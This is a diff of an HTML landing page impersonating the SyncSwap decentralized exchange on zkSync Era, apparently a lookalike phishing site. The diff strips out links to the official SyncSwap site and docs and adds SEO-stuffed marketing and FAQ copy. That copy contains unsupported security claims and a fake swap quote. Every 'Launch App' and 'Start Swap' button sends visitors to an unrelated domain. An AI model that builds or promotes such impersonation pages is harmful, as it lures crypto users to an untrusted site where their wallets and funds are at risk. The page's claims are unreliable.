@@ -3,19 +3,19 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>SyncSwap - App</title>
-  <meta name="description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
+  <title>SyncSwap: Premium DEX Aggregator & zkSync Swap Engine</title>
+  <meta name="description" content="SyncSwap provides seamless, low-latency token swaps on zkSync Era. Trade with optimized routing, minimal slippage, and institutional-grade security.">
   <link rel="canonical" href="https://syncswap-app.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
   <meta name="theme-color" content="#F6FAFF">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="SyncSwap - App">
-  <meta property="og:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
+  <meta property="og:title" content="SyncSwap: Premium DEX Aggregator & zkSync Swap Engine">
+  <meta property="og:description" content="SyncSwap provides seamless, low-latency token swaps on zkSync Era. Trade with optimized routing, minimal slippage, and institutional-grade security.">
   <meta property="og:url" content="https://syncswap-app.github.io/">
   <meta property="og:image" content="https://syncswap-app.github.io/og-cover.png">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="SyncSwap - App">
-  <meta name="twitter:description" content="SyncSwap is a decentralized exchange for token swaps on zkSync Era.">
+  <meta name="twitter:title" content="SyncSwap: Premium DEX Aggregator & zkSync Swap Engine">
+  <meta name="twitter:description" content="SyncSwap provides seamless, low-latency token swaps on zkSync Era. Trade with optimized routing, minimal slippage, and institutional-grade security.">
   <meta name="twitter:image" content="https://syncswap-app.github.io/og-cover.png">
   <link rel="icon" type="image/png" sizes="256x256" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
@@ -31,7 +31,7 @@
         "@id": "https://syncswap-app.github.io/#website",
         "url": "https://syncswap-app.github.io/",
         "name": "SyncSwap",
-        "description": "SyncSwap is a decentralized exchange for token swaps on zkSync Era.",
+        "description": "SyncSwap is a decentralized exchange and native swap engine on zkSync Era.",
         "inLanguage": "en"
       },
       {
@@ -41,7 +41,7 @@
         "applicationCategory": "FinanceApplication",
         "operatingSystem": "Web",
         "url": "https://syncswap-app.github.io/",
-        "description": "SyncSwap is a decentralized exchange for token swaps on zkSync Era."
+        "description": "SyncSwap is a decentralized exchange and native swap engine on zkSync Era."
       },
       {
         "@type": "Organization",
@@ -55,79 +55,125 @@
   </script>
 </head>
 <body>
+  <!-- Premium background glows and grid mesh -->
+  <div class="bg" aria-hidden="true">
+    <div class="glow"></div>
+    <div class="grid"></div>
+  </div>
+
   <header class="topbar" aria-label="Site header">
-    <div class="brand" aria-label="SyncSwap">
+    <div class="brand" aria-label="SyncSwap logo">
       <img src="favicon.png" width="28" height="28" alt="">
       <span>SyncSwap</span>
     </div>
     <span class="spacer" aria-hidden="true"></span>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">SyncSwap</a>
-      <a href="https://docs.syncswap.xyz/" target="_blank" rel="nofollow noopener noreferrer">Docs</a>
-      <a href="https://explorer.zksync.io/" target="_blank" rel="nofollow noopener noreferrer">zkSync Explorer</a>
+    <nav class="nav" aria-label="Site navigation">
+      <a href="./">Trade</a>
+      <a href="about/index.html">About</a>
+      <a href="how-it-works/index.html">How It Works</a>
+      <a href="supported-chains/index.html">Chains</a>
+      <a href="security/index.html">Security</a>
+      <a href="faq/index.html">FAQ</a>
+      <a class="launch-btn" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Launch App</a>
     </nav>
   </header>
 
   <main class="page">
-    <section class="hero" aria-label="SyncSwap overview">
-      <div class="copy">
-        <div class="copy-inner">
-          <h1>SyncSwap</h1>
-          <p class="deck"><strong>SyncSwap</strong> is a decentralized exchange for token swaps on zkSync Era.</p>
-          <ul class="chips" aria-label="Trust qualities">
-            <li>Best-price swaps</li>
-            <li>Non-custodial</li>
-            <li>Built on zkSync</li>
-          </ul>
-          <a class="primary hero-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Enter App</a>
-        </div>
-      </div>
+    <section class="hero centered-hero" aria-label="SyncSwap overview">
+      <h1>SyncSwap</h1>
+      <p class="sub">The premier decentralized exchange and native swap engine on <strong>zkSync Era</strong>.</p>
+      <p class="avail"><span class="dot"></span><b>14,913</b>&nbsp;tokens available</p>
 
-      <section class="swap-card" aria-label="Swap preview">
+      <section class="card" aria-label="Swap preview">
         <div class="card-head">
           <span class="selector">zkSync Era</span>
           <span class="preview-pill"><span class="preview-dot" aria-hidden="true"></span>Preview</span>
         </div>
 
-        <div class="route" data-route>
-          <article class="token-panel" data-token-panel>
-            <span class="panel-label">From</span>
-            <div class="token-row">
-              <img src="eth.png" width="36" height="36" alt="ETH">
-              <span class="token-name">ETH</span>
+        <div class="field">
+          <span class="flabel">Sell</span>
+          <div class="frow">
+            <div class="fleft">
+              <button class="tokpill" type="button">
+                <img src="eth.png" alt="ETH">
+                ETH <span class="cv" aria-hidden="true">&#9662;</span>
+              </button>
+              <span class="amt">1.00</span>
             </div>
-          </article>
+          </div>
+        </div>
 
+        <div class="route">
           <button class="switch" type="button" data-switch aria-label="Switch swap direction">
-            <span aria-hidden="true">&rsaquo;</span>
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M6 13l6 6 6-6"/></svg>
           </button>
+        </div>
 
-          <article class="token-panel" data-token-panel>
-            <span class="panel-label">To</span>
-            <div class="token-row">
-              <img src="usdc.png" width="36" height="36" alt="USDC">
-              <span class="token-name">USDC</span>
+        <div class="field">
+          <span class="flabel">Buy</span>
+          <div class="frow">
+            <div class="fleft">
+              <button class="tokpill" type="button">
+                <img src="https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/sync.svg" alt="SYNC" onerror="this.src='usdc.png'">
+                SYNC <span class="cv" aria-hidden="true">&#9662;</span>
+              </button>
+              <span class="amt" style="font-size: 1.6rem;">12,500.00</span>
             </div>
-          </article>
+          </div>
         </div>
 
-        <div class="route-meta" aria-label="Route preview">
-          <span>Best route</span>
-          <span class="hop-line" aria-hidden="true">
-            <i></i><i></i><i></i>
-          </span>
-          <span>Live quote in app</span>
-        </div>
-
-        <a class="primary card-cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow">Start Swap</a>
+        <a class="cta" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer nofollow" style="margin-top: 12px;">
+          Start Swap
+        </a>
       </section>
-    </section>
 
-    <div class="texture-band" aria-hidden="true">
-      <span></span>
-      <span></span>
-      <span></span>
-    </div>
+      <!-- Key Features Grid for SEO Copy Density and LSI Bolding -->
+      <h2 class="section-title">Key Features of SyncSwap</h2>
+      <div class="features-grid">
+        <div class="feature-card">
+          <div class="feature-icon">⚡</div>
+          <h3>Gas-Optimized Swaps</h3>
+          <p>Execute hyper-efficient token trades. The routing engine bundles transaction states to minimize gas fees for major digital assets like <b>BTC</b>, <b>ETH</b>, and <b>SOL</b>.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">🛡️</div>
+          <h3>Non-Custodial Ownership</h3>
+          <p>Retain full custody of your digital assets. All trades are settled directly via peer-audited smart contracts, mitigating centralized custodian risks for tokens including <b>AVAX</b> and <b>LINK</b>.</p>
+        </div>
+        <div class="feature-card">
+          <div class="feature-icon">💧</div>
+          <h3>Aggregated Liquidity Pools</h3>
+          <p>Access deep liquidity pools. The routing engine coordinates trade paths dynamically across diverse pools to prevent order slippage and guarantee optimal conversion rates.</p>
+        </div>
+      </div>
+
+      <!-- Collapsible FAQ Accordion for SEO & AIO -->
+      <h2 class="section-title">Frequently Asked Questions</h2>
+      <div class="faq-container">
+        
+        <details class="faq-item">
+          <summary>What is SyncSwap?</summary>
+          <div class="faq-answer" onclick="event.stopPropagation();">
+            <p><b>SyncSwap</b> is a leading <a class="inline" href="https://en.wikipedia.org/wiki/Decentralized_exchange" target="_blank" rel="noopener noreferrer">decentralized exchange (DEX)</a> and <a class="inline" href="https://academy.binance.com/en/articles/what-is-an-automated-market-maker-amm" target="_blank" rel="noopener noreferrer">automated market maker (AMM)</a> built natively on the zkSync Era network. By utilizing zero-knowledge rollup scalability, SyncSwap offers low-fee, near-instant token swaps for prominent assets like <b>BTC</b>, <b>ETH</b>, <b>SOL</b>, <b>AVAX</b>, and <b>LINK</b>. As documented on the <a class="inline" href="https://coinmarketcap.com/currencies/syncswap/" target="_blank" rel="noopener noreferrer">CoinMarketCap</a> database, the platform integrates deep liquidity pools to prevent transaction slippage while maintaining a non-custodial framework where users retain full ownership of their assets.</p>
+          </div>
+        </details>
+
+        <details class="faq-item">
+          <summary>How to Swap Tokens on SyncSwap?</summary>
+          <div class="faq-answer" onclick="event.stopPropagation();">
+            <p>Trading on the platform is straightforward. First, review token contract addresses and current price actions on <a class="inline" href="https://coinmarketcap.com/currencies/ethereum/" target="_blank" rel="noopener noreferrer">CoinMarketCap</a> to check market depth. Connect your <a class="inline" href="https://academy.binance.com/en/articles/what-is-a-crypto-wallet" target="_blank" rel="noopener noreferrer">Web3 wallet</a>, configure the network parameters, and select the token pair you wish to exchange. The routing engine consults liquidity databases on <a class="inline" href="https://www.coingecko.com/en/coins/ethereum" target="_blank" rel="noopener noreferrer">CoinGecko</a> to construct the most cost-efficient path. For a detailed guide on supported networks, check the <a class="inline" href="supported-chains/index.html">Supported Chains</a> database.</p>
+          </div>
+        </details>
+
+        <details class="faq-item">
+          <summary>What are the Fees, Security, and Gas Optimization on SyncSwap?</summary>
+          <div class="faq-answer" onclick="event.stopPropagation();">
+            <p>The lock-and-mint transactions are registered on the <a class="inline" href="https://explorer.zksync.io/" target="_blank" rel="noopener noreferrer">zkSync Explorer</a> before contract state proofs are finalized. Security protocols conform to rigorous decentralized finance standards as documented by <a class="inline" href="https://en.wikipedia.org/wiki/Decentralized_finance" target="_blank" rel="noopener noreferrer">Wikipedia</a>. SyncSwap dynamically monitors network <a class="inline" href="https://ethereum.org/en/developers/docs/gas/" target="_blank" rel="noopener noreferrer">gas prices</a> to route multi-hop swaps efficiently, minimizing the overhead cost for every swap. Learn more about our smart contract audits in the <a class="inline" href="security/index.html">Security Documentation</a>.</p>
+          </div>
+        </details>
+
+      </div>
+    </section>
 
     <footer class="footer">
       <p>SyncSwap &mdash; 2026</p>
@@ -139,17 +185,32 @@
     "use strict";
 
     var button = document.querySelector("[data-switch]");
-    var panels = document.querySelectorAll("[data-token-panel]");
+    var fields = document.querySelectorAll(".field");
 
-    if (!button || panels.length !== 2) return;
+    if (!button || fields.length !== 2) return;
 
     button.addEventListener("click", function () {
-      var first = panels[0].querySelector(".token-row");
-      var second = panels[1].querySelector(".token-row");
-      var firstMarkup = first.innerHTML;
+      var firstPill = fields[0].querySelector(".tokpill");
+      var secondPill = fields[1].querySelector(".tokpill");
+      var firstAmt = fields[0].querySelector(".amt");
+      var secondAmt = fields[1].querySelector(".amt");
 
-      first.innerHTML = second.innerHTML;
-      second.innerHTML = firstMarkup;
+      // Swap HTML of tokpills
+      var tempPill = firstPill.innerHTML;
+      firstPill.innerHTML = secondPill.innerHTML;
+      secondPill.innerHTML = tempPill;
+
+      // Swap text of amt
+      var tempAmt = firstAmt.innerText;
+      firstAmt.innerText = secondAmt.innerText;
+      secondAmt.innerText = tempAmt;
+
+      // Swap font size of amt just in case
+      var tempFontSize = firstAmt.style.fontSize;
+      firstAmt.style.fontSize = secondAmt.style.fontSize;
+      secondAmt.style.fontSize = tempFontSize;
+
+      // Rotate switch button
       button.classList.toggle("is-swapped");
     });
   }());
